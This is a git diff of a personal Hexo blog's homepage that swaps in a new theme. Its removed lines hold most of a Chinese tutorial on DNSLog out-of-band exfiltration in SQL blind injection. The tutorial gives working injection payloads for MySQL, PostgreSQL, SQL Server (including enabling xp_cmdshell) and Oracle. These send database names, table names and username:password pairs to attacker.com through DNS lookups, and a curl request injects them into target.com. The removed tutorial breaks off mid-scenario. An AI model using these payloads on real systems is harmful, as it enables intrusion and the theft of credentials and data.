@@ -1,496 +1,188 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
-  
-  <title>我的个人博客</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="这是一个使用Hexo和Fluid主题搭建的个人博客">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>我的个人博客 - 记录生活，分享技术</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这是一个使用Hexo和Fluid主题搭建的个人博客">
 <meta property="og:type" content="website">
 <meta property="og:title" content="我的个人博客">
 <meta property="og:url" content="https://g1s2y3.github.io/index.html">
 <meta property="og:site_name" content="我的个人博客">
 <meta property="og:description" content="这是一个使用Hexo和Fluid主题搭建的个人博客">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://g1s2y3.github.io/img/butterfly-icon.png">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="我的个人博客" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-  
-<link rel="stylesheet" href="/css/style.css">
-
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
-
-  
-  
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
-
-<meta name="generator" content="Hexo 7.3.0"></head>
-
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">我的个人博客</a>
-      </h1>
+<meta name="twitter:image" content="https://g1s2y3.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "我的个人博客",
+  "alternateName": [
+    "记录生活，分享技术",
+    "g1s2y3.github.io"
+  ],
+  "url": "https://g1s2y3.github.io/"
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://g1s2y3.github.io/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
       
-        <h2 id="subtitle-wrap">
-          <a href="/" id="subtitle">记录生活，分享技术</a>
-        </h2>
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '我的个人博客',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'home'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="page" id="body-wrap"><header class="full_page" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">我的个人博客</span></a></span><div id="menus"></div></nav><div id="site-info"><h1 id="site-title">我的个人博客</h1></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts nc" id="recent-posts"><div class="recent-post-items"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2026/04/24/DNSLog%E5%A4%96%E5%B8%A6%E5%8E%9F%E7%90%86%E5%8F%8ASQL%E7%9B%B2%E6%B3%A8%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/" title="无标题">无标题</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2026-04-24T08:56:57.827Z" title="发表于 2026-04-24 16:56:57">2026-04-24</time></span></div><div class="content">DNSLog外带原理及在SQL盲注中的使用详解目录 1. DNSLog基础原理 2. DNSLog外带工作机制 3. SQL盲注中的DNSLog外带技术 4. 实际攻击场景分析 5. 防御措施 6. 高级技巧与绕过 7. 工具推荐   1. DNSLog基础原理1.1 什么是DNSLogDNSLog是一种利用DNS查询记录来外带信息的技术。当目标服务器执行了包含域名的SQL语句时，会向DNS服务器发送查询请求，这些查询记录会被记录在DNS日志中，攻击者可以通过监控DNS日志来获取查询内容，从而间接获取数据库中的敏感信息。 1.2 DNS查询过程12客户端 → DNS服务器：查询example.com的IP地址DNS服务器 → 客户端：返回example.com对应的IP地址  1.3 DNSLog的特点 隐蔽性：利用正常的DNS查询机制，不易被WAF等安全设备检测 无文件：不需要在目标服务器上写入文件，避免了写入权限限制 低权限：只需要执行SQL语句的权限即可 实时性：DNS查询几乎是即时的，能够快速获取结果   2. DNSLog外带工作机制2.1 基本工作流程1234561....</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2024/01/01/hello-world/" title="Hello World">Hello World</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-12-31T16:00:00.000Z" title="发表于 2024-01-01 00:00:00">2024-01-01</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E9%9A%8F%E7%AC%94/">随笔</a></span></div><div class="content">Welcome to my blog! This is my first post using Hexo and Fluid theme. About this blogThis is a personal blog where I’ll share my thoughts, experiences, and technical knowledge. I’m excited to start this journey and hope you’ll find something interesting here. Features Beautiful and responsive design Dark mode support Reading progress indicator Code highlighting Image lightbox Math formula support And many more!  Getting startedTo create a new post, run: 1hexo new &quot;Your Post Title&quot;  ...</div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">John Doe</div><div class="author-info-description">这是一个使用Hexo和Fluid主题搭建的个人博客</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/24/DNSLog%E5%A4%96%E5%B8%A6%E5%8E%9F%E7%90%86%E5%8F%8ASQL%E7%9B%B2%E6%B3%A8%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/" title="无标题">无标题</a><time datetime="2026-04-24T08:56:57.827Z" title="发表于 2026-04-24 16:56:57">2026-04-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/01/hello-world/" title="Hello World">Hello World</a><time datetime="2023-12-31T16:00:00.000Z" title="发表于 2024-01-01 00:00:00">2024-01-01</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E9%9A%8F%E7%AC%94/"><span class="card-category-list-name">随笔</span><span class="card-category-list-count">1</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/Hello/" style="font-size: 1.1em; color: #999">Hello</a> <a href="/tags/World/" style="font-size: 1.1em; color: #999">World</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
       
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://g1s2y3.github.io"></form>
-      </div>
-    </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main">
   
-    <article id="post-DNSLog外带原理及SQL盲注使用详解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2026/04/24/DNSLog%E5%A4%96%E5%B8%A6%E5%8E%9F%E7%90%86%E5%8F%8ASQL%E7%9B%B2%E6%B3%A8%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/" class="article-date">
-  <time class="dt-published" datetime="2026-04-24T08:56:57.827Z" itemprop="datePublished">2026-04-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
+    <ul class="card-archive-list">
       
-        <h1 id="DNSLog外带原理及在SQL盲注中的使用详解"><a href="#DNSLog外带原理及在SQL盲注中的使用详解" class="headerlink" title="DNSLog外带原理及在SQL盲注中的使用详解"></a>DNSLog外带原理及在SQL盲注中的使用详解</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
-<li><a href="#1*dnslog%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86">1. DNSLog基础原理</a></li>
-<li><a href="#2*dnslog%E5%A4%96%E5%B8%A6%E5%B7%A5%E4%BD%9C%E6%9C%BA%E5%88%B6">2. DNSLog外带工作机制</a></li>
-<li><a href="#3*sql%E7%9B%B2%E6%B3%A8%E4%B8%AD%E7%9A%84dnslog%E5%A4%96%E5%B8%A6%E6%8A%80%E6%9C%AF">3. SQL盲注中的DNSLog外带技术</a></li>
-<li><a href="#4*%E5%AE%9E%E9%99%85%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF%E5%88%86%E6%9E%90">4. 实际攻击场景分析</a></li>
-<li><a href="#5*%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">5. 防御措施</a></li>
-<li><a href="#6*%E9%AB%98%E7%BA%A7%E6%8A%80%E5%B7%A7%E4%B8%8E%E7%BB%95%E8%BF%87">6. 高级技巧与绕过</a></li>
-<li><a href="#7*%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90">7. 工具推荐</a></li>
-</ul>
-<hr>
-<h2 id="1-DNSLog基础原理"><a href="#1-DNSLog基础原理" class="headerlink" title="1. DNSLog基础原理"></a>1. DNSLog基础原理</h2><h3 id="1-1-什么是DNSLog"><a href="#1-1-什么是DNSLog" class="headerlink" title="1.1 什么是DNSLog"></a>1.1 什么是DNSLog</h3><p>DNSLog是一种利用DNS查询记录来外带信息的技术。当目标服务器执行了包含域名的SQL语句时，会向DNS服务器发送查询请求，这些查询记录会被记录在DNS日志中，攻击者可以通过监控DNS日志来获取查询内容，从而间接获取数据库中的敏感信息。</p>
-<h3 id="1-2-DNS查询过程"><a href="#1-2-DNS查询过程" class="headerlink" title="1.2 DNS查询过程"></a>1.2 DNS查询过程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">客户端 → DNS服务器：查询example.com的IP地址</span><br><span class="line">DNS服务器 → 客户端：返回example.com对应的IP地址</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-3-DNSLog的特点"><a href="#1-3-DNSLog的特点" class="headerlink" title="1.3 DNSLog的特点"></a>1.3 DNSLog的特点</h3><ul>
-<li><strong>隐蔽性</strong>：利用正常的DNS查询机制，不易被WAF等安全设备检测</li>
-<li><strong>无文件</strong>：不需要在目标服务器上写入文件，避免了写入权限限制</li>
-<li><strong>低权限</strong>：只需要执行SQL语句的权限即可</li>
-<li><strong>实时性</strong>：DNS查询几乎是即时的，能够快速获取结果</li>
-</ul>
-<hr>
-<h2 id="2-DNSLog外带工作机制"><a href="#2-DNSLog外带工作机制" class="headerlink" title="2. DNSLog外带工作机制"></a>2. DNSLog外带工作机制</h2><h3 id="2-1-基本工作流程"><a href="#2-1-基本工作流程" class="headerlink" title="2.1 基本工作流程"></a>2.1 基本工作流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 攻击者构造特殊的DNS域名（如：attacker.com）</span><br><span class="line">2. 将敏感信息编码后拼接到域名中</span><br><span class="line">3. 通过SQL注入执行查询语句</span><br><span class="line">4. 数据库查询触发DNS请求</span><br><span class="line">5. DNS服务器记录查询日志</span><br><span class="line">6. 攻击者通过DNS查询日志获取信息</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-2-DNS请求的触发条件"><a href="#2-2-DNS请求的触发条件" class="headerlink" title="2.2 DNS请求的触发条件"></a>2.2 DNS请求的触发条件</h3><p>在MySQL中，触发DNS查询的函数包括：</p>
-<ul>
-<li><code>LOAD_FILE()</code></li>
-<li><code>OUTFILE</code> 和 <code>DUMPFILE</code>（需要特定配置）</li>
-<li><code>SELECT ... INTO OUTFILE</code>（需要特定配置）</li>
-<li>自定义函数（如UDF）</li>
-</ul>
-<h3 id="2-3-数据编码方式"><a href="#2-3-数据编码方式" class="headerlink" title="2.3 数据编码方式"></a>2.3 数据编码方式</h3><p>由于DNS域名只能包含特定的字符（a<em>z, 0</em>9, .*），需要将数据进行编码：</p>
-<ol>
-<li><p><strong>Base64编码</strong></p>
-<ul>
-<li>适用于所有字符</li>
-<li>编码后可能包含&#x2F;、+、&#x3D;等字符，需要进一步处理</li>
-</ul>
-</li>
-<li><p><strong>Hex编码</strong></p>
-<ul>
-<li>将每个字节转换为两位十六进制</li>
-<li>然后将十六进制数字转换为字母</li>
-</ul>
-</li>
-<li><p><strong>自定义编码</strong></p>
-<ul>
-<li>字母转换：a&#x3D;1, b&#x3D;2, …, z&#x3D;26</li>
-<li>数字保持不变</li>
-<li>其他字符需要特殊处理</li>
-</ul>
-</li>
-</ol>
-<hr>
-<h2 id="3-SQL盲注中的DNSLog外带技术"><a href="#3-SQL盲注中的DNSLog外带技术" class="headerlink" title="3. SQL盲注中的DNSLog外带技术"></a>3. SQL盲注中的DNSLog外带技术</h2><h3 id="3-1-基本盲注原理"><a href="#3-1-基本盲注原理" class="headerlink" title="3.1 基本盲注原理"></a>3.1 基本盲注原理</h3><p>DNSLog主要用于带外（Out<em>of</em>Band）数据提取，特别适用于以下场景：</p>
-<ol>
-<li><strong>无法显示结果的盲注</strong>（如基于时间盲注）</li>
-<li><strong>需要获取大量数据时</strong>（比时间盲注更高效）</li>
-<li><strong>绕过WAF过滤</strong>（DNS请求相对隐蔽）</li>
-</ol>
-<h3 id="3-2-MySQL中的DNSLog注入"><a href="#3-2-MySQL中的DNSLog注入" class="headerlink" title="3.2 MySQL中的DNSLog注入"></a>3.2 MySQL中的DNSLog注入</h3><h4 id="3-2-1-使用LOAD-FILE函数"><a href="#3-2-1-使用LOAD-FILE函数" class="headerlink" title="3.2.1 使用LOAD_FILE函数"></a>3.2.1 使用LOAD_FILE函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span> 基本语法</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="string">&#x27;\\\\&#x27;</span> <span class="operator">||</span> (<span class="keyword">SELECT</span> database()) <span class="operator">||</span> <span class="string">&#x27;.attacker.com\\test.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span> 获取当前数据库</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(concat(<span class="string">&#x27;\\\\&#x27;</span>, (<span class="keyword">SELECT</span> database()), <span class="string">&#x27;.attacker.com\\a&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span> 获取版本信息</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(concat(<span class="string">&#x27;\\\\&#x27;</span>, (<span class="keyword">SELECT</span> version()), <span class="string">&#x27;.attacker.com\\a&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span> 获取用户名</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(concat(<span class="string">&#x27;\\\\&#x27;</span>, (<span class="keyword">SELECT</span> <span class="keyword">user</span>()), <span class="string">&#x27;.attacker.com\\a&#x27;</span>));</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-2-2-利用DNS子域名传输数据"><a href="#3-2-2-利用DNS子域名传输数据" class="headerlink" title="3.2.2 利用DNS子域名传输数据"></a>3.2.2 利用DNS子域名传输数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span> 获取数据库表名</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(concat(<span class="string">&#x27;\\\\&#x27;</span>, (<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()), <span class="string">&#x27;.attacker.com\\a&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span> 获取列名</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(concat(<span class="string">&#x27;\\\\&#x27;</span>, (<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>), <span class="string">&#x27;.attacker.com\\a&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span> 获取数据</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(concat(<span class="string">&#x27;\\\\&#x27;</span>, (<span class="keyword">select</span> group_concat(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> users), <span class="string">&#x27;.attacker.com\\a&#x27;</span>));</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-3-其他数据库中的DNSLog注入"><a href="#3-3-其他数据库中的DNSLog注入" class="headerlink" title="3.3 其他数据库中的DNSLog注入"></a>3.3 其他数据库中的DNSLog注入</h3><h4 id="3-3-1-PostgreSQL"><a href="#3-3-1-PostgreSQL" class="headerlink" title="3.3.1 PostgreSQL"></a>3.3.1 PostgreSQL</h4><p>PostgreSQL没有直接的LOAD_FILE函数，但可以通过其他方式触发DNS请求：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span> 利用<span class="keyword">copy</span>命令（需要特定权限）</span><br><span class="line"><span class="keyword">COPY</span> (<span class="keyword">SELECT</span> database()) <span class="keyword">TO</span> PROGRAM <span class="string">&#x27;nslookup $(database()).attacker.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span> 利用dblink扩展</span><br><span class="line"><span class="keyword">SELECT</span> dblink_connect(<span class="string">&#x27;host=&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> database())<span class="operator">||</span><span class="string">&#x27;.attacker.com&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-3-2-SQL-Server"><a href="#3-3-2-SQL-Server" class="headerlink" title="3.3.2 SQL Server"></a>3.3.2 SQL Server</h4><p>SQL Server可以利用xp_cmdshell执行命令：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span> 启用xp_cmdshell</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span> 执行DNS查询</span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;nslookup &#x27;</span><span class="operator">+</span>@<span class="variable">@version</span><span class="operator">+</span><span class="string">&#x27;.attacker.com&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-3-3-Oracle"><a href="#3-3-3-Oracle" class="headerlink" title="3.3.3 Oracle"></a>3.3.3 Oracle</h4><p>Oracle可以通过UTL_INADDR包触发DNS请求：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span> 获取数据库名</span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.get_host_name((<span class="keyword">SELECT</span> database_name <span class="keyword">FROM</span> v$database)<span class="operator">||</span><span class="string">&#x27;.attacker.com&#x27;</span>) <span class="keyword">FROM</span> dual;</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span> 获取用户名</span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.get_host_name((<span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">FROM</span> dual)<span class="operator">||</span><span class="string">&#x27;.attacker.com&#x27;</span>) <span class="keyword">FROM</span> dual;</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="4-实际攻击场景分析"><a href="#4-实际攻击场景分析" class="headerlink" title="4. 实际攻击场景分析"></a>4. 实际攻击场景分析</h2><h3 id="4-1-场景一：获取当前数据库"><a href="#4-1-场景一：获取当前数据库" class="headerlink" title="4.1 场景一：获取当前数据库"></a>4.1 场景一：获取当前数据库</h3><p><strong>目标</strong>：获取当前数据库名称</p>
-<p><strong>攻击流程</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 构造注入语句</span></span><br><span class="line">payload=<span class="string">&quot;SELECT LOAD_FILE(concat(&#x27;\\\\&#x27;,(SELECT database()),&#x27;.attacker.com\\a&#x27;))&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 发送请求</span></span><br><span class="line">curl <span class="string">&quot;http://target.com/page.php?id=<span class="variable">$&#123;payload&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 监控DNS查询</span></span><br><span class="line">dig @8.8.8.8 example.com AXFR</span><br></pre></td></tr></table></figure>
-
-<p><strong>DNS日志示例</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2026*04*24 10:30:00 query: id 12345 example.com IN A</span><br><span class="line">2026*04*24 10:30:00 query: id 12346 testdb.example.com IN A</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-2-场景二：枚举表名"><a href="#4-2-场景二：枚举表名" class="headerlink" title="4.2 场景二：枚举表名"></a>4.2 场景二：枚举表名</h3><p><strong>目标</strong>：获取数据库中的所有表名</p>
-<p><strong>攻击流程</strong>：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span> 分段获取表名（避免DNS查询长度限制）</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(</span><br><span class="line">    concat(</span><br><span class="line">        <span class="string">&#x27;\\\\&#x27;</span>,</span><br><span class="line">        (<span class="keyword">select</span> <span class="built_in">substring</span>(group_concat(table_name),<span class="number">1</span>,<span class="number">30</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),</span><br><span class="line">        <span class="string">&#x27;.attacker.com\\a&#x27;</span></span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-3-场景三：获取敏感数据"><a href="#4-3-场景三：获取敏感数据" class="headerlink" title="4.3 场景三：获取敏感数据"></a>4.3 场景三：获取敏感数据</h3><p><strong>目标</strong>：获取用户表中的用户名和密码</p>
-<p><strong>攻击流程</strong>：</p>
